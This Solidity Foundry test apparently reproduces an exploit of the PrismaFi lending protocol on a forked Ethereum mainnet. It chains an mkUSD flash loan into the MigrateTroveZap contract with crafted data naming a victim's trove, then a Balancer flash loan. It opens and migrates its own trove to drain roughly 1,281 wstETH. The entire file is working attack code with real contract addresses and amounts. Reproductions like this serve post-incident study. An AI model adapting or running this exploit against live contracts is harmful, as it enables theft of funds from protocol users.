// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IERC20.sol";

import "./IPriceFeed.sol";
import "./IMkUSDLoan.sol";
import "./IBorrowerOperations.sol";

contract PrismaFiTest is Test {
    IBalancerVault constant vault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IPriceFeed constant priceFeed =
        IPriceFeed(0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac);

    IMkUSDLoan constant mkUSD =
        IMkUSDLoan(0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28);

    IERC20 constant wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);

    IBorrowerOperations constant borrowerOperations =
        IBorrowerOperations(0x72c590349535AD52e6953744cb2A36B409542719);

    address constant MigrateTroveZap =
        0xcC7218100da61441905e0c327749972e3CBee9EE;

    address constant troveManager = 0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6;
    address public upperHint = 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A;
    address public lowerHint = 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F;

    function setUp() public {
        vm.createSelectFork("mainnet", 19532297 - 1);

        deal(address(mkUSD), address(this), 1.800000022022732637 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // uint256 price = priceFeed.fetchPrice(wstETH);

        print("start with ~1800 mkUSD: ", mkUSD.balanceOf(address(this)), 18);
        print("start with wstETH ", wstETH.balanceOf(address(this)), 18);

        bytes memory data = abi.encode(
            0x56A201b872B50bBdEe0021ed4D1bb36359D291ED, // account
            troveManager, // troveManagerFrom
            troveManager, // troveManagerTo
            5000000325833471, // maxFeePercentage
            463184447350099685758, // coll
            upperHint, // upperHint
            lowerHint // lowerHint
        );

        mkUSD.flashLoan(
            MigrateTroveZap,
            address(mkUSD),
            1442100.643475620087665721 ether,
            data
        );

        address[] memory tokens = new address[](1);
        tokens[0] = address(wstETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1 ether;
        vault.flashLoan(address(this), tokens, amounts, abi.encode(""));

        print(
            "wstETH balance ~1281.79 ETH after attack: ",
            wstETH.balanceOf(address(this)),
            18
        );
    }

    function receiveFlashLoan(
        IERC20[] memory /* tokens */,
        uint256[] memory /* amounts */,
        uint256[] memory /* feeAmounts */,
        bytes memory /* userData */
    ) external {
        // approve borowOperations to spend wstETH with max amount
        wstETH.approve(address(borrowerOperations), type(uint256).max);

        // set delegate approval
        borrowerOperations.setDelegateApproval(MigrateTroveZap, true);
        // open trove
        borrowerOperations.openTrove(
            troveManager, // TroveManager,
            address(this),
            5000000325833471, // _maxFeePercentage
            1 ether, // _collateralAmount
            2000 ether, // _debtAmount
            upperHint, // _upperHint
            lowerHint // _lowerHint
        );

        bytes memory data = abi.encode(
            address(this), // account
            troveManager, // troveManagerFrom
            troveManager, // troveManagerTo
            5000000325833471, // maxFeePercentage
            1282797208306130557587, // coll
            upperHint, // upperHint
            lowerHint // lowerHint
        );
        mkUSD.flashLoan(MigrateTroveZap, address(mkUSD), 2000 ether, data);

        borrowerOperations.closeTrove(troveManager, address(this));

        // transfer the wstETH loan back to the vault
        wstETH.transfer(address(vault), 1 ether);
    }
}
